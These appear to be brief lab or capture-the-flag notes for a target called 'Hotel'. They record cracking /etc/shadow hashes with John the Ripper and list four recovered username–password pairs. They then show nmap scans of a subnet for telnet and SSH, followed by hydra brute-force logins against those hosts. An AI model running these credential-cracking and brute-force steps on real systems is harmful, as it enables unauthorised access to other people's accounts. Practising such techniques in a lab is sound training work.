# Hotel

Hashes in `/etc/shadow`

```bash
john --wordlist=3000passwds.txt hash1.txt
```

- guest - qazwsx
- vincent - love123
- oliwia - superstar
- charles - password

```bash
nmap -sV  10.128.161.0/24 | grep -B 6 "telnet"
```

```bash
nmap -sV  10.128.161.0/24 | grep -B 6 "ssh"
```

```bash
hydra -t 4 -C pairs.txt -M ssh-servers.txt ssh
```

```bash
hydra -t 4 -C pairs.txt -M telnet-servers.txt telnet
```